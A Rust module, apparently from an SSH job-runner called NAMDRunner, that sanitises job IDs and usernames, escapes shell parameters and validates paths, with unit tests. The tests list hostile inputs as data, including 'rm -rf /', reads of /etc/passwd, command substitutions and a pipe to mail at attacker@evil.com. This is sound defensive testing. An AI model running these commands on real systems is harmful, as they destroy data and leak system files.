use anyhow::{Result, anyhow};
use std::path::Path;

/// Job validation business logic
pub mod job_validation;

/// Input validation and sanitization for security-critical operations
pub mod input {
    use super::*;

    /// Maximum length for job IDs and usernames to prevent memory exhaustion
    const MAX_IDENTIFIER_LENGTH: usize = 64;

    /// Sanitize and validate a job ID
    ///
    /// Job IDs must be:
    /// - Alphanumeric characters, underscores, and hyphens only
    /// - Between 1 and 64 characters
    /// - No directory traversal sequences
    /// - No absolute paths
    pub fn sanitize_job_id(input: &str) -> Result<String> {
        // Basic length validation
        if input.is_empty() {
            return Err(anyhow!("Job ID cannot be empty"));
        }

        if input.len() > MAX_IDENTIFIER_LENGTH {
            return Err(anyhow!("Job ID too long (max {} characters)", MAX_IDENTIFIER_LENGTH));
        }

        // Check for directory traversal attempts
        if input.contains("..") || input.starts_with('/') || input.starts_with('\\') {
            return Err(anyhow!("Job ID contains invalid path sequences"));
        }

        // Check for null bytes and other dangerous characters
        if input.contains('\0') {
            return Err(anyhow!("Job ID contains null bytes"));
        }

        // Check for non-ASCII characters (Unicode) - reject entirely for security
        if !input.is_ascii() {
            return Err(anyhow!("Job ID contains non-ASCII characters"));
        }

        // Filter to safe characters only
        let sanitized: String = input.chars()
            .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
            .collect();

        // Verify we didn't strip everything
        if sanitized.is_empty() {
            return Err(anyhow!("Job ID contains no valid characters"));
        }

        // Verify sanitized version matches original (no dangerous chars were present)
        if sanitized != input {
            return Err(anyhow!("Job ID contains invalid characters (only alphanumeric, underscore, and hyphen allowed)"));
        }

        Ok(sanitized)
    }

    /// Sanitize and validate a username
    ///
    /// Similar rules to job IDs but may have slightly different constraints
    pub fn sanitize_username(input: &str) -> Result<String> {
        // Basic length validation
        if input.is_empty() {
            return Err(anyhow!("Username cannot be empty"));
        }

        if input.len() > MAX_IDENTIFIER_LENGTH {
            return Err(anyhow!("Username too long (max {} characters)", MAX_IDENTIFIER_LENGTH));
        }

        // Check for directory traversal attempts
        if input.contains("..") || input.starts_with('/') || input.starts_with('\\') {
            return Err(anyhow!("Username contains invalid path sequences"));
        }

        // Check for null bytes and shell metacharacters
        if input.contains('\0') {
            return Err(anyhow!("Username contains null bytes"));
        }

        // Check for shell metacharacters that could enable command injection
        let dangerous_chars = ['$', '`', ';', '|', '&', '>', '<', '(', ')', '{', '}', '[', ']', '\'', '"', ' ', '\t', '\n', '\r'];
        if input.chars().any(|c| dangerous_chars.contains(&c)) {
            return Err(anyhow!("Username contains shell metacharacters"));
        }

        // Filter to safe characters - allow dots for usernames like "john.doe"
        let sanitized: String = input.chars()
            .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-' || *c == '.')
            .collect();

        // Verify we didn't strip everything
        if sanitized.is_empty() {
            return Err(anyhow!("Username contains no valid characters"));
        }

        // Verify sanitized version matches original
        if sanitized != input {
            return Err(anyhow!("Username contains invalid characters"));
        }

        Ok(sanitized)
    }

    /// Validate that a relative file path is safe (no traversal, no absolute paths, no null bytes)
    ///
    /// Used for validating user-provided relative paths like file downloads
    pub fn validate_relative_file_path(path: &str) -> Result<()> {
        if path.is_empty() {
            return Err(anyhow!("File path cannot be empty"));
        }

        if path.contains('\0') {
            return Err(anyhow!("File path contains null bytes"));
        }

        if path.starts_with('/') {
            return Err(anyhow!("File path must be relative, not absolute"));
        }

        if path.contains("..") {
            return Err(anyhow!("File path contains directory traversal"));
        }

        Ok(())
    }

    /// Validate that a constructed path is safe
    ///
    /// This performs additional validation on complete paths to ensure
    /// they don't escape intended directories through canonicalization
    pub fn validate_path_safety(path: &str, allowed_prefixes: &[&str]) -> Result<()> {
        // Convert to Path for proper handling
        let path_obj = Path::new(path);

        // Check for absolute paths (should be relative to user directories)
        if path_obj.is_absolute() {
            // For our use case, absolute paths are actually expected
            // (e.g., /projects/user/{JOB_BASE_DIRECTORY}/job_001)
            // So we validate against allowed prefixes instead
        }

        // Normalize the path to resolve any .. sequences
        let canonical_path = match path_obj.canonicalize() {
            Ok(p) => p,
            Err(_) => {
                // Path doesn't exist yet, which is fine for directory creation
                // But we can still validate the components
                let mut normalized = std::path::PathBuf::new();
                for component in path_obj.components() {
                    match component {
                        std::path::Component::ParentDir => {
                            // Don't allow going up directories in our validation
                            return Err(anyhow!("Path contains parent directory references"));
                        }
                        std::path::Component::CurDir => {
                            // Current dir is fine, just skip
                            continue;
                        }
                        _ => {
                            normalized.push(component);
                        }
                    }
                }
                normalized
            }
        };

        // Check if the path starts with any allowed prefix
        let path_str = canonical_path.to_string_lossy();
        let is_allowed = allowed_prefixes.iter().any(|prefix| {
            path_str.starts_with(prefix)
        });

        if !is_allowed {
            return Err(anyhow!("Path '{}' is not within allowed directories", path_str));
        }

        Ok(())
    }
}

/// Shell command construction utilities
pub mod shell {
    /// Safely escape a parameter for shell commands
    ///
    /// This uses proper shell escaping to prevent command injection
    pub fn escape_parameter(param: &str) -> String {
        // Use single quotes for strong quoting, escaping any single quotes in the string
        if param.contains('\'') {
            // If the string contains single quotes, we need to escape them
            format!("'{}'", param.replace('\'', "'\"'\"'"))
        } else {
            // Simple case - just wrap in single quotes
            format!("'{}'", param)
        }
    }

    /// Safely build a cd command followed by another command
    pub fn safe_cd_and_run(directory: &str, command: &str) -> String {
        format!("cd {} && {}", escape_parameter(directory), command)
    }
}

/// File validation utilities for NAMDRunner
/// Directory path utilities for NAMDRunner
pub mod paths {
    use super::*;
    use crate::ssh::directory_structure::JobDirectoryStructure;

    /// Generate a safe project directory path for a user and job
    pub fn project_directory(username: &str, job_id: &str) -> Result<String> {
        let clean_username = super::input::sanitize_username(username)?;
        let clean_job_id = super::input::sanitize_job_id(job_id)?;

        let (path, allowed_prefixes) = if cfg!(windows) {
            let path = format!("C:\\Users\\{}\\{}\\{}", clean_username, crate::ssh::directory_structure::JOB_BASE_DIRECTORY, clean_job_id);
            (path, vec!["C:\\Users\\"])
        } else {
            // Use centralized function for consistent path generation
            let path = JobDirectoryStructure::project_dir(&clean_username, &clean_job_id);
            (path, JobDirectoryStructure::project_allowed_prefixes())
        };

        // Validate the path is within allowed directories
        super::input::validate_path_safety(&path, &allowed_prefixes.to_vec())?;

        Ok(path)
    }

    /// Generate a safe scratch directory path for a user and job
    pub fn scratch_directory(username: &str, job_id: &str) -> Result<String> {
        let clean_username = super::input::sanitize_username(username)?;
        let clean_job_id = super::input::sanitize_job_id(job_id)?;

        let (path, allowed_prefixes) = if cfg!(windows) {
            let path = format!("C:\\scratch\\{}\\{}\\{}", clean_username, crate::ssh::directory_structure::JOB_BASE_DIRECTORY, clean_job_id);
            (path, vec!["C:\\scratch\\"])
        } else {
            // Use centralized function for consistent path generation
            let path = JobDirectoryStructure::scratch_dir(&clean_username, &clean_job_id);
            (path, JobDirectoryStructure::scratch_allowed_prefixes())
        };

        // Validate the path is within allowed directories
        super::input::validate_path_safety(&path, &allowed_prefixes.to_vec())?;

        Ok(path)
    }

}

#[cfg(test)]
mod tests {
    use super::*;

    mod input_tests {
        use super::*;

        #[test]
        fn test_valid_job_ids() {
            let valid_ids = vec!["job_001", "test-job", "MyJob123", "job_with_underscores"];

            for id in valid_ids {
                assert!(input::sanitize_job_id(id).is_ok(), "Should accept valid ID: {}", id);
            }
        }

        #[test]
        fn test_malicious_job_ids() {
            let long_string = "a".repeat(100);
            let malicious_ids = vec![
                "../../../etc/passwd",  // Directory traversal
                "/absolute/path",        // Absolute path
                "job; rm -rf /",        // Command injection
                "job\x00hidden",        // Null byte injection
                "job|malicious",        // Pipe injection
                "job&background",       // Background execution
                "job$(whoami)",         // Command substitution
                "job`whoami`",          // Command substitution
                "job\\escape",          // Backslash
                "job\"quote",           // Double quote
                "job'quote",            // Single quote
                &long_string,           // Length attack
                "",                     // Empty string
                "job with spaces",      // Spaces
            ];

            for id in malicious_ids {
                let result = input::sanitize_job_id(id);
                assert!(result.is_err(), "Should reject malicious ID: {}", id);
            }
        }

        #[test]
        fn test_valid_usernames() {
            let valid_usernames = vec!["testuser", "john.doe", "user_123", "user-name"];

            for username in valid_usernames {
                assert!(input::sanitize_username(username).is_ok(), "Should accept valid username: {}", username);
            }
        }

        #[test]
        fn test_malicious_usernames() {
            let malicious_usernames = vec![
                "../admin",              // Directory traversal
                "/root",                 // Absolute path
                "user; whoami",          // Command injection
                "user\x00",              // Null byte
                "user|admin",            // Pipe
                "user&admin",            // Background
                "user$(id)",             // Command substitution
                "user`id`",              // Command substitution
                "user'admin'",           // Single quotes
                "user\"admin\"",         // Double quotes
                "user with spaces",      // Spaces
                "user\ttab",             // Tab
                "user\nnewline",         // Newline
            ];

            for username in malicious_usernames {
                let result = input::sanitize_username(username);
                assert!(result.is_err(), "Should reject malicious username: {}", username);
            }
        }

        #[test]
        fn test_path_validation() {
            use crate::ssh::directory_structure::JobDirectoryStructure;
            // Valid paths - cross-platform
            if cfg!(windows) {
                assert!(input::validate_path_safety(&format!("C:\\Users\\user\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY), &["C:\\Users\\"]).is_ok());
                assert!(input::validate_path_safety(&format!("C:\\scratch\\user\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY), &["C:\\scratch\\"]).is_ok());
            } else {
                // Use centralized path generation for consistent testing
                let project_path = JobDirectoryStructure::project_dir("user", "job_001");
                let scratch_path = JobDirectoryStructure::scratch_dir("user", "job_001");
                assert!(input::validate_path_safety(&project_path, &JobDirectoryStructure::project_allowed_prefixes()).is_ok());
                assert!(input::validate_path_safety(&scratch_path, &JobDirectoryStructure::scratch_allowed_prefixes()).is_ok());
            }

            // Invalid paths (if they could be resolved)
            // Note: These tests assume the paths don't exist, so we're testing the component validation
        }
    }

    mod shell_tests {
        use super::*;

        #[test]
        fn test_shell_escaping() {
            assert_eq!(shell::escape_parameter("simple"), "'simple'");
            assert_eq!(shell::escape_parameter("with spaces"), "'with spaces'");
            assert_eq!(shell::escape_parameter("with'quote"), "'with'\"'\"'quote'");
            assert_eq!(shell::escape_parameter("dangerous;command"), "'dangerous;command'");
        }
    }

    mod path_tests {
        use super::*;

        #[test]
        fn test_project_directory_generation() {
            use crate::ssh::directory_structure::JobDirectoryStructure;
            let result = paths::project_directory("testuser", "job_001").unwrap();
            if cfg!(windows) {
                assert_eq!(result, format!("C:\\Users\\testuser\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY));
            } else {
                // Should match centralized path generation
                let expected = JobDirectoryStructure::project_dir("testuser", "job_001");
                assert_eq!(result, expected);
            }
        }

        #[test]
        fn test_scratch_directory_generation() {
            use crate::ssh::directory_structure::JobDirectoryStructure;
            let result = paths::scratch_directory("testuser", "job_001").unwrap();
            if cfg!(windows) {
                assert_eq!(result, format!("C:\\scratch\\testuser\\{}\\job_001", crate::ssh::directory_structure::JOB_BASE_DIRECTORY));
            } else {
                // Should match centralized path generation
                let expected = JobDirectoryStructure::scratch_dir("testuser", "job_001");
                assert_eq!(result, expected);
            }
        }

        #[test]
        fn test_malicious_path_generation() {
            // Should fail with malicious inputs
            assert!(paths::project_directory("../admin", "job_001").is_err());
            assert!(paths::project_directory("testuser", "../../../etc").is_err());
        }
    }

    #[test]
    fn test_comprehensive_security_scenarios() {
        // Test the complete workflow with malicious inputs
        let malicious_scenarios = vec![
            ("../../../root", "job_001"),
            ("testuser", "; rm -rf /"),
            ("test\x00user", "job_001"),
            ("testuser", "job$(whoami)"),
            ("user|admin", "job_001"),
        ];

        for (username, job_id) in malicious_scenarios {
            // Both project and scratch directory generation should fail
            assert!(paths::project_directory(username, job_id).is_err(),
                    "Should reject malicious combo: {} / {}", username, job_id);
            assert!(paths::scratch_directory(username, job_id).is_err(),
                    "Should reject malicious combo: {} / {}", username, job_id);
        }
    }

    mod shell_security_tests {
        use super::*;

        #[test]
        fn test_shell_parameter_escaping() {
            // Test basic escaping
            assert_eq!(shell::escape_parameter("normal_file"), "'normal_file'");
            assert_eq!(shell::escape_parameter("file with spaces"), "'file with spaces'");

            // Test single quote escaping
            assert_eq!(shell::escape_parameter("file'with'quotes"), "'file'\"'\"'with'\"'\"'quotes'");

            // Test dangerous characters are safely escaped
            let dangerous_inputs = vec![
                "; rm -rf /",
                "file$(whoami)",
                "file`whoami`",
                "file|malicious",
                "file&background",
                "file>redirect",
                "file<input",
                "../../../etc/passwd",
            ];

            for input in dangerous_inputs {
                let escaped = shell::escape_parameter(input);
                // All dangerous inputs should be wrapped in single quotes
                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                        "Input '{}' should be wrapped: {}", input, escaped);
                // Should not contain unescaped dangerous characters outside quotes
                assert!(!escaped[1..escaped.len()-1].contains('\'') || escaped.contains("'\"'\"'"),
                        "Input '{}' not properly escaped: {}", input, escaped);
            }
        }

        #[test]
        fn test_safe_command_builders() {
            // Test safe_cd_and_run
            let cd_cmd = shell::safe_cd_and_run("/working/dir", "sbatch job.sbatch");
            assert_eq!(cd_cmd, "cd '/working/dir' && sbatch job.sbatch");

            // Test with malicious directory
            let malicious_cd = shell::safe_cd_and_run("; echo 'hacked'", "echo normal");
            assert_eq!(malicious_cd, "cd '; echo '\"'\"'hacked'\"'\"'' && echo normal");
        }

        #[test]
        fn test_command_injection_prevention() {
            // These should all be safely escaped and not executable as commands
            let injection_attempts = vec![
                "; cat /etc/passwd",
                "$(whoami)",
                "`id`",
                "file && rm -rf /",
                "file || malicious_command",
                "file > /etc/passwd",
                "file | mail attacker@evil.com",
            ];

            for attempt in injection_attempts {
                let escaped = shell::escape_parameter(attempt);
                // Should be wrapped in single quotes, making it a literal string
                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                        "Injection attempt should be wrapped: {}", attempt);
            }
        }
    }

    mod integration_tests {
        use super::*;

        #[test]
        fn test_end_to_end_security_validation() {
            // Test complete security validation workflow (business logic only)
            // This tests the integration of all validation components without external calls

            // Test malicious usernames with valid job IDs
            let malicious_usernames = vec![
                "../../../admin",
                "user$(whoami)",
                "user|admin",
            ];
            let valid_job_id = "job_001";

            for username in malicious_usernames {
                // Malicious usernames should be caught by validation
                assert!(input::sanitize_username(username).is_err(),
                        "Should reject malicious username: {}", username);

                // Path generation should fail for malicious usernames
                assert!(paths::project_directory(username, valid_job_id).is_err(),
                        "Should reject malicious path generation: {} / {}", username, valid_job_id);
                assert!(paths::scratch_directory(username, valid_job_id).is_err(),
                        "Should reject malicious scratch path: {} / {}", username, valid_job_id);
            }

            // Test malicious job IDs with valid username
            let malicious_job_ids = vec![
                "; rm -rf /",
                "job`ls`",
                "job$(whoami)",
            ];
            let valid_username = "testuser";

            for job_id in malicious_job_ids {
                // Malicious job IDs should be caught by validation
                assert!(input::sanitize_job_id(job_id).is_err(),
                        "Should reject malicious job ID: {}", job_id);

                // Path generation should fail for malicious job IDs
                assert!(paths::project_directory(valid_username, job_id).is_err(),
                        "Should reject malicious path generation: {} / {}", valid_username, job_id);
                assert!(paths::scratch_directory(valid_username, job_id).is_err(),
                        "Should reject malicious scratch path: {} / {}", valid_username, job_id);
            }
        }

        #[test]
        fn test_command_injection_prevention() {
            // Test that all command builders prevent injection (business logic only)
            let malicious_paths = vec![
                "; rm -rf /",
                "$(whoami)",
                "`id`",
                "file && malicious_command",
                "file || backup_attack",
                "../../../etc/passwd",
            ];

            for path in malicious_paths {
                // All malicious paths should be safely escaped
                let escaped = shell::escape_parameter(path);
                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                        "Path should be wrapped in single quotes: {}", path);

                // Test command builder uses proper escaping
                let cd_cmd = shell::safe_cd_and_run(path, "ls");

                // Command should contain the escaped version
                assert!(cd_cmd.contains('\''), "cd command should use escaping");

                // Commands should properly escape dangerous characters
                // The && is within quotes, which is properly escaped
                assert!(cd_cmd.contains("'"),
                        "cd command should use quotes for escaping: {}", cd_cmd);
            }
        }


        #[test]
        fn test_centralized_validation_consistency() {
            // Test that all validation uses consistent patterns (business logic only)
            let test_inputs = vec!["normal_input", "test-123", "valid_file.txt"];

            for input in test_inputs {
                // All validation functions should use consistent character sets
                if let Ok(sanitized_id) = input::sanitize_job_id(input) {
                    assert!(!sanitized_id.contains(' '), "Job IDs should not contain spaces");
                    assert!(sanitized_id.is_ascii(), "Job IDs should be ASCII");
                }

                if let Ok(sanitized_username) = input::sanitize_username(input) {
                    assert!(!sanitized_username.contains(' '), "Usernames should not contain spaces");
                    assert!(sanitized_username.is_ascii(), "Usernames should be ASCII");
                }

                // Shell escaping should be consistent
                let escaped = shell::escape_parameter(input);
                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                        "All parameters should be consistently escaped");
            }
        }
    }
}